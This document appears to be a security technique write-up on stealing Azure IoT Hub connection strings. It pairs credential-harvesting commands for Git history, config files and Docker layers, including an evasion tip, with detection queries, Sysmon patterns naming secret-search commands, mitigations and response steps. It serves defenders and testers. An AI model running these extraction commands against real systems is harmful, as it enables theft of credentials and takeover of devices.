# [IOT-EDGE-002]: Azure IoT Hub Connection String Theft

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | IOT-EDGE-002 |
| **MITRE ATT&CK v18.1** | [T1552.001 - Unsecured Credentials: Credentials in Files](https://attack.mitre.org/techniques/T1552/001/) |
| **Tactic** | Credential Access |
| **Platforms** | Azure IoT Hub, Azure IoT Edge, M365, Containers |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | Azure IoT Hub (all versions), Azure IoT Edge 1.0+, Azure SDK 2.0+ |
| **Patched In** | N/A (Design issue, requires secure credential management) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Azure IoT Hub connection strings are high-privilege credentials that grant full access to IoT devices, device twins, and message queues. These strings are frequently hardcoded in application source code, stored in unencrypted configuration files, embedded in Docker images, or left in environment variables. Attackers who extract connection strings gain the ability to authenticate to Azure IoT Hub as the legitimate owner, read all device telemetry, modify device configurations, send cloud-to-device commands, and establish persistent access. Connection strings often contain Shared Access Keys valid for years, making them extremely valuable targets.

**Attack Surface:** Configuration files (appsettings.json, web.config, .env, terraform files), Docker image layers, Git repositories, CI/CD pipeline logs, environment variables in container runtimes, and application binaries (embedded via compiler optimizations).

**Business Impact:** **Complete Compromise of IoT Infrastructure**. Stolen connection strings grant unauthorized parties the ability to spoof legitimate devices, inject false sensor data, disable legitimate devices, and exfiltrate confidential telemetry data. In critical infrastructure (utilities, healthcare, manufacturing), this can lead to operational disruption, data breaches, and loss of customer trust.

**Technical Context:** Connection strings follow the pattern `HostName=<hub>.azure-devices.net;SharedAccessKeyName=<key-name>;SharedAccessKey=<base64-key>`. Extraction typically takes <5 minutes if credentials are in plaintext. Detection likelihood is **Low** if Git history is not monitored and **High** if Azure Activity Logs are configured for connection string pattern detection.

### Operational Risk

- **Execution Risk:** Low – No privilege escalation required; extraction via string search or Git history analysis
- **Stealth:** High – Git repository access and file reads generate minimal forensic trails
- **Reversibility:** No – Once connection string is stolen, attacker has indefinite access until key is rotated

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS Azure Foundations Benchmark 2.3 | Credentials must not be hardcoded in code repositories |
| **DISA STIG** | AP-2.a | Ensure cryptographic mechanisms are used to protect sensitive data |
| **CISA SCuBA** | ID.BE-1 | Organizational risk management strategy must address credential storage |
| **NIST 800-53** | SA-3 (System Development Life Cycle), SC-7 (Boundary Protection) | Secure credential management throughout development lifecycle |
| **GDPR** | Art. 25 (Data Protection by Design) | Credentials must be protected by default |
| **DORA** | Art. 11 | Critical incidents from credential theft must be reported |
| **NIS2** | Art. 21 | Credential theft is a reportable cybersecurity incident |
| **ISO 27001** | A.6.2.1 (Personnel screening), A.8.2.4 (User responsibilities) | Developers must follow secure credential practices |
| **ISO 27005** | Risk assessment for credential theft | Identify and mitigate risks from hardcoded credentials |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Read access to configuration files, source code repositories, or Docker image layers
- **Required Access:** File access, Git repository access, or container registry access

**Supported Versions:**
- **Azure IoT Hub:** All versions (SDK 2.0+)
- **Azure IoT Edge:** 1.0 - 1.4.8 (latest)
- **Docker:** 18.0 - 26.0+
- **Git:** 2.0+

**Tools:**
- [Git](https://git-scm.com/) – Version 2.0+ (for Git history analysis)
- [Grep](https://www.gnu.org/software/grep/) – Built-in (pattern matching)
- [Azure CLI](https://docs.microsoft.com/en-us/cli/azure/) – Version 2.30+ (for Cloud retrieval)
- [jq](https://stedolan.github.io/jq/) – JSON parser (optional)
- [TruffleHog](https://github.com/trufflesecurity/trufflehog) – Secrets scanner (optional, for automated detection)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

#### Management Station / PowerShell Reconnaissance

```powershell
# Search for connection strings in Azure Key Vault (if available)
az keyvault secret list --vault-name myKeyVault --query "[].{name:name, id:id}"

# Retrieve all IoT Hub connection strings (requires IoT Hub Owner role)
az iot hub connection-string show --hub-name myIoTHub

# Check for connection strings in application configuration
Get-Content "C:\app\appsettings.json" | Select-String -Pattern "HostName" | Select-Object Line
```

**What to Look For:**
- Plaintext connection strings in Azure KeyVault (indicates secure practice)
- Connection strings returned by Azure CLI (attacker has elevated permissions)
- Presence of multiple connection strings (indicates replicated secrets across environments)

#### Linux/Bash / CLI Reconnaissance

```bash
# Search for connection strings in common code locations
grep -r "HostName.*azure-devices.net" /home /opt /var/www 2>/dev/null | head -10

# Search Git history for connection strings
cd /path/to/repo && git log -p --all -S "SharedAccessKey" | grep -B 2 -A 2 "SharedAccessKey"

# Check environment variables
env | grep -i "connection\|iot\|azure"

# Search Docker compose files and Dockerfiles
find . -name "docker-compose.yml" -o -name "Dockerfile" | xargs grep -i "HostName\|SharedAccessKey"
```

**What to Look For:**
- Connection strings matching the pattern `HostName=*;SharedAccessKey=*`
- Git history containing deleted connection strings (indicates previous exposure)
- Environment variable references to connection strings (indicates runtime injection)

---

## 4. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Extracting Connection Strings from Git History

**Supported Versions:** Git 2.0+, all code repositories

#### Step 1: Clone or Access Target Repository

**Objective:** Gain access to the Git repository containing IoT Hub configuration

**Command:**
```bash
# Clone the repository (if attacker has read access)
git clone https://github.com/target/iot-app.git
cd iot-app
```

**Expected Output:**
```
Cloning into 'iot-app'...
remote: Counting objects: 1234, done.
remote: Compressing objects: 100% (567/567), done.
remote: Receiving objects: 100% (1234/1234), 123.45 MiB | 5.67 MiB/s
Unpacking objects: 100% (1234/1234), done.
```

**What This Means:**
- Repository is now accessible locally for analysis
- Git history contains all commits, branches, and deleted files
- Secrets in any historical commit can be extracted

#### Step 2: Search Git History for Connection Strings

**Objective:** Identify commits containing Azure IoT Hub connection strings

**Command:**
```bash
git log -p --all -S "HostName" | grep -B 5 -A 5 "SharedAccessKey"
```

**Expected Output:**
```
commit abc123def456
Author: Developer <dev@example.com>
Date:   2024-12-15 10:30:00 +0000

    Update IoT Hub configuration

- "ConnectionString": "HostName=myhub.azure-devices.net;SharedAccessKeyName=owner;SharedAccessKey=AbCdEfGhIjKlMnOpQrStUvWxYz1234567890abcdefgh="
```

**What This Means:**
- The connection string was committed at a specific date/time
- The commit is visible in Git history regardless of deletion
- The key `AbCdEfGhIjKlMnOpQrStUvWxYz1234567890abcdefgh=` is the Shared Access Key

**OpSec & Evasion:**
- Git history access may be logged in GitHub/Azure DevOps audit logs
- Evasion: Access through a cloned local copy to avoid remote access logs
- Detection likelihood: **Medium** – Git audit logs can detect unusual access patterns

**Troubleshooting:**
- **Error:** `fatal: Not a git repository`
  - **Cause:** Not in the root of the Git repository
  - **Fix:** Navigate to the repository root: `cd /path/to/repo && git log`

- **Error:** `fatal: your current branch 'main' does not have any commits yet`
  - **Cause:** Repository is empty or on wrong branch
  - **Fix:** List all branches: `git branch -a` and switch: `git checkout <branch>`

**References & Proofs:**
- [Git Log Documentation](https://git-scm.com/docs/git-log)
- [GitHub Security Advisory on Secrets in Repositories](https://docs.github.com/en/code-security/secret-scanning/)

#### Step 3: Extract and Parse Connection String

**Objective:** Parse the connection string to identify individual credential components

**Command:**
```bash
# Extract the full connection string from git log
CONNECTION_STRING=$(git log -p --all -S "HostName" | grep "SharedAccessKey" | head -1 | sed 's/.*HostName/HostName/' | sed 's/".*//g')
echo "$CONNECTION_STRING"

# Parse individual components
IFS=';' read -ra PARTS <<< "$CONNECTION_STRING"
for part in "${PARTS[@]}"; do
  echo "$part"
done
```

**Expected Output:**
```
HostName=myhub.azure-devices.net;SharedAccessKeyName=owner;SharedAccessKey=AbCdEfGhIjKlMnOpQrStUvWxYz1234567890abcdefgh=
HostName=myhub.azure-devices.net
SharedAccessKeyName=owner
SharedAccessKey=AbCdEfGhIjKlMnOpQrStUvWxYz1234567890abcdefgh=
```

**What This Means:**
- `HostName`: Azure IoT Hub endpoint
- `SharedAccessKeyName`: User/role that owns the key (often "owner" or "service")
- `SharedAccessKey`: The base64-encoded cryptographic key used for authentication

**References & Proofs:**
- [Azure IoT Hub Connection String Documentation](https://docs.microsoft.com/en-us/azure/iot-hub/iot-hub-dev-guide-sas#connection-string-structure)

### METHOD 2: Extracting Connection Strings from Configuration Files

**Supported Versions:** All versions

#### Step 1: Identify Configuration Files

**Objective:** Locate configuration files that may contain connection strings

**Command:**
```bash
find . -name "appsettings.json" -o -name "web.config" -o -name ".env" -o -name "*.conf" | head -20
```

**Expected Output:**
```
./appsettings.json
./appsettings.Development.json
./src/config/.env
./docker-compose.yml
```

**What This Means:**
- Multiple configuration files may contain connection strings
- Development and production configurations often differ
- `.env` files are commonly unencrypted

#### Step 2: Search for Connection Strings

**Command:**
```bash
# Search JSON files
jq '.["ConnectionStrings"]["IoTHub"]' appsettings.json

# Search .env files
grep "IOT_HUB_CONNECTION_STRING\|HostName" .env

# Search web.config
grep -i "connectionstring" web.config
```

**Expected Output:**
```json
"HostName=myhub.azure-devices.net;SharedAccessKeyName=owner;SharedAccessKey=AbCdEfGhIjKlMnOpQrStUvWxYz1234567890abcdefgh="
```

**References & Proofs:**
- [OWASP: Secrets in Configuration Files](https://owasp.org/www-community/vulnerabilities/Sensitive_Data_Exposure)

### METHOD 3: Extracting Connection Strings from Docker Images

**Supported Versions:** Docker 18.0+

#### Step 1: Export Docker Image

**Objective:** Extract Docker image layers to analyze for connection strings

**Command:**
```bash
# Save image to tar file
docker save myregistry.azurecr.io/iot-app:latest -o iot-app.tar

# Extract layers
tar -xf iot-app.tar -C extracted-layers/
```

**Expected Output:**
```
extracted-layers/
├── blobs/
│   └── sha256/
│       ├── abc123... (base OS layer)
│       ├── def456... (dependencies layer)
│       └── ghi789... (application layer)
└── manifest.json
```

#### Step 2: Search Layers for Connection Strings

**Command:**
```bash
# Extract and search all layers
for layer in extracted-layers/blobs/sha256/*; do
  tar -xf "$layer" -O 2>/dev/null | strings | grep -i "HostName.*azure-devices"
done
```

**Expected Output:**
```
HostName=myhub.azure-devices.net;SharedAccessKeyName=owner;SharedAccessKey=AbCdEfGhIjKlMnOpQrStUvWxYz1234567890abcdefgh=
```

**References & Proofs:**
- [Docker Image Analysis Tools](https://github.com/wagoodman/dive)

---

## 5. ATTACK SIMULATION & VERIFICATION

#### Atomic Red Team

- **Atomic Test ID:** T1552.001 - Test #2 (Credentials in Configuration Files)
- **Test Name:** Extract credentials from configuration files
- **Description:** Simulates extraction of credentials from .env, JSON, and XML configuration files
- **Supported Versions:** Linux, Windows, macOS
- **Command:**
  ```bash
  find . -name "*.json" -o -name ".env" -o -name "*.conf" | xargs grep -E "connection|password|key|secret" 2>/dev/null
  ```
- **Cleanup Command:**
  ```bash
  # No artifacts to clean; read-only enumeration
  ```

**Reference:** [Atomic Red Team T1552.001](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1552.001/T1552.001.yaml)

---

## 6. TOOLS & COMMANDS REFERENCE

#### TruffleHog (Secrets Scanner)
**Version:** 3.0+
**Minimum Version:** 2.0
**Supported Platforms:** Linux, Windows, macOS

**Installation:**
```bash
pip install truffleHog
```

**Usage:**
```bash
# Scan Git repository for secrets
truffleHog git https://github.com/target/repo.git

# Scan local filesystem
truffleHog filesystem /path/to/code

# Scan with custom regex for IoT Hub connection strings
truffleHog filesystem /path/to/code --regex "HostName=.*SharedAccessKey=.*"
```

#### Grep + Sed Pipeline
**Native Tools**

**Usage:**
```bash
# Search for IoT Hub connection strings
grep -r "HostName.*azure-devices" /path/to/code

# Extract just the SharedAccessKey
grep -oP 'SharedAccessKey=\K[^=]*' config.json
```

---

## 7. MICROSOFT SENTINEL DETECTION

#### Query 1: Detect Connection String Access in Audit Logs

**Rule Configuration:**
- **Required Table:** AuditLogs, ActivityLog
- **Required Fields:** OperationName, TargetResources, InitiatedBy, properties
- **Alert Severity:** High
- **Frequency:** Run every 15 minutes
- **Applies To Versions:** All Azure IoT Hub versions

**KQL Query:**
```kusto
AuditLogs
| where OperationName in ("Get IoT Hub ConnectionString", "List IoT Hub Keys", "Regenerate IoT Hub Key")
| where Result == "Success"
| summarize Count = count() by InitiatedBy.user.userPrincipalName, OperationName, TimeGenerated
| where Count > 0
| sort by TimeGenerated desc
```

**What This Detects:**
- Successful retrieval of IoT Hub connection strings from Azure Portal or CLI
- Key regeneration operations (indicates potential credential rotation)
- Multiple connection string retrievals in short time window

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics** → **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `Detect IoT Hub Connection String Theft`
   - Severity: `High`
4. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `15 minutes`
   - Lookup data from the last: `1 hour`
5. **Incident settings Tab:**
   - Enable **Create incidents**
6. Click **Review + create** → **Create**

#### Query 2: Detect Git Repository Access for Secrets

**KQL Query:**
```kusto
AuditLogs
| where OperationName == "Get git log" or OperationName == "Clone repository"
| where UserType == "User"
| summarize AccessCount = count() by UserPrincipalName, OperationName, TimeGenerated
| where AccessCount > 3
```

---

## 8. WINDOWS EVENT LOG MONITORING

**Event ID: 4662 (An operation was performed on an object)**
- **Log Source:** Security
- **Trigger:** Retrieval of Key Vault secrets containing connection strings
- **Filter:** ObjectName contains "iot-hub-connection-string" OR Properties contains "SharedAccessKey"
- **Applies To Versions:** Windows Server 2019+

**Manual Configuration Steps (Group Policy):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration**
3. Enable: **Audit Object Access**
4. Set to: **Success and Failure**
5. Run `gpupdate /force`

---

## 9. SYSMON DETECTION PATTERNS

**Minimum Sysmon Version:** 13.0+
**Supported Platforms:** Linux (auditbeat), Windows

**Sysmon Config Snippet:**
```xml
<Sysmon schemaversion="4.30">
  <EventFiltering>
    <!-- Detect git log commands searching for secrets -->
    <ProcessCreate onmatch="include">
      <CommandLine condition="contains">git log -p</CommandLine>
      <CommandLine condition="contains">SharedAccessKey</CommandLine>
      <CommandLine condition="contains">HostName</CommandLine>
    </ProcessCreate>
    
    <!-- Detect grep on config files -->
    <ProcessCreate onmatch="include">
      <Image condition="contains">grep</Image>
      <CommandLine condition="contains">appsettings.json</CommandLine>
      <CommandLine condition="contains">.env</CommandLine>
    </ProcessCreate>
    
    <!-- Detect Docker save operations -->
    <ProcessCreate onmatch="include">
      <Image condition="contains">docker</Image>
      <CommandLine condition="contains">save</CommandLine>
    </ProcessCreate>
  </EventFiltering>
</Sysmon>
```

---

## 10. MICROSOFT DEFENDER FOR CLOUD

#### Detection Alert: Credentials Detected in Code Repository

**Alert Name:** Sensitive Credentials Found in Code Repository
- **Severity:** Critical
- **Description:** Connection strings or access keys detected in Git repository history
- **Applies To:** Repositories scanned by Microsoft Defender for DevOps
- **Remediation:** Rotate the exposed key immediately; remove from Git history using `git filter-branch` or `git filter-repo`

**Manual Configuration Steps:**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **DevOps Security** (if available)
3. Select repository → **Scan Results**
4. Filter by severity: **Critical**
5. Identify detected connection strings
6. Take immediate action: Rotate the key in IoT Hub

---

## 11. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

#### Query: Monitor Azure IoT Hub Key Retrieval

```powershell
Search-UnifiedAuditLog -Operations "Get Azure IoT Hub Key", "Generate SAS Token" `
  -StartDate (Get-Date).AddDays(-7) `
  -ResultSize 5000 | Select-Object UserIds, Operations, CreationDate, ClientIP, RecordType | Sort-Object CreationDate -Descending
```

- **Operation:** GetIoTHubKey, GenerateSASToken, GetConnectionString
- **Workload:** Azure IoT
- **Details:** Analyze AuditData blob for connection string patterns
- **Applies To:** M365 E5 + Azure subscriptions

**Manual Configuration Steps:**
1. Navigate to **Microsoft Purview Compliance Portal** (compliance.microsoft.com)
2. Go to **Audit** → **Search**
3. Set **Date range** and filter by **Operations**: `Get Azure IoT Hub Key`
4. Review results for unauthorized access
5. Export: **Export** → **Download all results** → `audit-log.csv`

---

## 12. DEFENSIVE MITIGATIONS

#### Priority 1: CRITICAL

- **Use Azure Key Vault for Connection String Storage:** Never hardcode connection strings; retrieve them at runtime from Key Vault.
  
  **Applies To Versions:** All
  
  **Manual Steps (PowerShell - Store Connection String in Key Vault):**
  ```powershell
  $keyVaultName = "myKeyVault"
  $secretName = "iot-hub-connection-string"
  
  # Store connection string in Key Vault
  $connectionString = "HostName=myhub.azure-devices.net;SharedAccessKeyName=owner;SharedAccessKey=..."
  az keyvault secret set --vault-name $keyVaultName --name $secretName --value $connectionString
  
  # Grant application access to Key Vault
  $appObjectId = "00000000-0000-0000-0000-000000000000"  # Replace with app object ID
  az keyvault set-policy --name $keyVaultName --object-id $appObjectId --secret-permissions get list
  ```
  
  **Manual Steps (Application Code - Retrieve from Key Vault):**
  ```csharp
  // C# example using Azure.Identity
  var credential = new DefaultAzureCredential();
  var client = new SecretClient(new Uri($"https://{keyVaultName}.vault.azure.net/"), credential);
  KeyVaultSecret secret = await client.GetSecretAsync("iot-hub-connection-string");
  string connectionString = secret.Value;
  ```

- **Enable GitHub Secret Scanning:** Automatically detect and alert on exposed connection strings in repositories.
  
  **Manual Steps (GitHub):**
  1. Go to **Settings** → **Code security and analysis**
  2. Enable **Secret scanning**
  3. Configure **Push protection** to block commits containing secrets
  4. Review **Secret scanning alerts** dashboard for detected credentials

- **Use Managed Identities Instead of Connection Strings:** Replace all connection string authentication with Azure Managed Identity (system-assigned or user-assigned).
  
  **Manual Steps (Azure IoT Edge with Managed Identity):**
  ```bash
  # Deploy IoT Edge module using managed identity
  az iot edge deployment create --hub-name myHub --deployment-id prod-deployment \
    --content deployment.json \
    --auth-type MSI  # Use Managed Service Identity
  
  # No connection string needed; module authenticates via MSI token
  ```

#### Priority 2: HIGH

- **Rotate IoT Hub Keys Regularly:** Implement automated key rotation to limit exposure window of stolen credentials.
  
  **Manual Steps (PowerShell - Rotate Keys):**
  ```powershell
  # Regenerate primary key
  $resourceGroup = "myResourceGroup"
  $hubName = "myIoTHub"
  
  az iot hub policy key renew --hub-name $hubName --policy-name "owner" --regen-primary
  
  # Wait for applications to restart and consume new key
  Start-Sleep -Seconds 30
  
  # Verify key regeneration
  az iot hub policy show --hub-name $hubName --name "owner"
  ```

- **Implement Azure Policy to Prevent Hardcoded Credentials:** Block code commits containing connection strings at the repository level.
  
  **Manual Steps (GitHub Advanced Security):**
  1. Go to **Settings** → **Code security and analysis**
  2. Enable **Secret scanning**
  3. Configure **Push protection**
  4. Set rule: Block commits if patterns match `HostName=.*SharedAccessKey=`

#### Access Control & Policy Hardening

- **Restrict IoT Hub Key Access via RBAC:**
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **IoT Hub** → **Access Control (IAM)**
  2. Click **+ Add** → **Add role assignment**
  3. Select role: `IoT Hub Data Contributor` (least-privilege alternative to Owner)
  4. Assign to: Service principal or managed identity only
  5. Click **Review + assign**

- **Conditional Access: Require MFA for Key Retrieval:**
  
  **Manual Steps:**
  1. Go to **Entra ID** → **Security** → **Conditional Access**
  2. Create policy: Require MFA when accessing Key Vault containing connection strings

#### Validation Command (Verify Fix)

```bash
# Verify no connection strings in Git history
git log -p --all | grep -c "SharedAccessKey"
# Expected Output: 0 (no matches)

# Verify Key Vault contains the connection string
az keyvault secret show --vault-name myKeyVault --name "iot-hub-connection-string" --query "value"
# Expected Output: <connection-string-value>

# Verify application uses Key Vault reference
grep -r "DefaultAzureCredential\|@Microsoft.KeyVault" src/
# Expected Output: References to secure credential retrieval
```

**What to Look For:**
- No connection strings in Git history
- Connection string stored in Key Vault
- Application code references secure credential retrieval mechanism

---

## 13. DETECTION & INCIDENT RESPONSE

#### Indicators of Compromise (IOCs)

- **Files:** Git commits containing `HostName=*.azure-devices.net;SharedAccessKey=*`, `.env` files with connection strings, Docker image layers with embedded secrets
- **Network:** Outbound MQTT/AMQP connections to `*.azure-devices.net` using stolen connection strings
- **Cloud:** Azure Activity Log entries showing connection string retrieval from unexpected IP addresses or users

#### Forensic Artifacts

- **Git History:** `git log -p --all | grep -B 5 -A 5 "SharedAccessKey"`
- **Key Vault Audit:** Azure Monitor logs showing connection string access events
- **Docker Images:** Manifest.json and layer files containing connection string references
- **Application Logs:** Connection attempts using stolen credentials

#### Response Procedures

1. **Isolate:**
   ```bash
   # Regenerate IoT Hub keys immediately
   az iot hub policy key renew --hub-name myIoTHub --policy-name "owner" --regen-primary
   
   # Revoke all devices (if compromise is widespread)
   az iot hub device-identity delete --hub-name myIoTHub --device-id "*"  # Use with caution
   ```

2. **Collect Evidence:**
   ```bash
   # Export Azure Activity Log
   az monitor activity-log list --resource-group myResourceGroup --output json > activity-log.json
   
   # Export Git history
   git log -p --all > git-history.txt
   
   # Export Key Vault audit logs
   az monitor log-analytics query --workspace myWorkspace --analytics-query "AuditLogs | where OperationName contains 'IoT' | top 1000 by TimeGenerated"
   ```

3. **Remediate:**
   ```bash
   # Rotate key in Key Vault
   $newKey = "$(az iot hub policy show --hub-name myIoTHub --name owner --query primaryKey -o tsv)"
   az keyvault secret set --vault-name myKeyVault --name iot-hub-connection-string --value $newKey
   
   # Restart all applications to reload new key
   # (application-specific restart commands)
   ```

---

## 14. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IOT-EDGE-002] | **Attacker extracts Azure IoT Hub connection string** |
| **2** | **Credential Access** | [IOT-EDGE-001] IoT Device Credential Extraction | Attacker uses connection string to enumerate device credentials |
| **3** | **Lateral Movement** | [IOT-EDGE-004] Device Provisioning Service Abuse | Attacker registers rogue devices using stolen connection string |
| **4** | **Persistence** | [IOT-EDGE-003] Edge Module Compromise | Attacker deploys malicious modules to IoT Hub |
| **5** | **Impact** | Data Exfiltration | Attacker exfiltrates telemetry data from all devices |

---

## 15. REAL-WORLD EXAMPLES

#### Example 1: Exposed Azure Storage Connection Strings in GitHub (2021)

- **Target:** Cloud-native applications
- **Timeline:** Ongoing since 2021
- **Technique Status:** GitHub secret scanning now detects these automatically, but manual detection still common
- **Impact:** Thousands of repositories exposed; attackers accessed storage accounts and exfiltrated data
- **Reference:** [GitHub Security Lab: Exposed Secrets in Public Repositories](https://securitylab.github.com/)

#### Example 2: Azure DevOps Pipeline Secret Exposure (2023)

- **Target:** CI/CD pipelines for IoT applications
- **Timeline:** 2023
- **Technique Status:** Connection strings hardcoded in pipeline YAML files
- **Impact:** Attackers accessed IoT Hub via stolen pipeline secrets; deployed malicious modules to production devices
- **Reference:** [OWASP: Secrets in CI/CD](https://owasp.org/www-community/vulnerabilities/Secrets_in_CI-CD_Pipelines)

---

## SUMMARY

**IOT-EDGE-002** represents a **critical and pervasive vulnerability** in IoT application development. Connection strings are frequently mishandled, exposed in code repositories, hardcoded in applications, and embedded in Docker images. Organizations must implement **secret management solutions (Key Vault, managed identities), automated secret scanning, and secure development practices** to defend against this threat. Regular audits of codebases and remediation of exposed credentials are essential.

---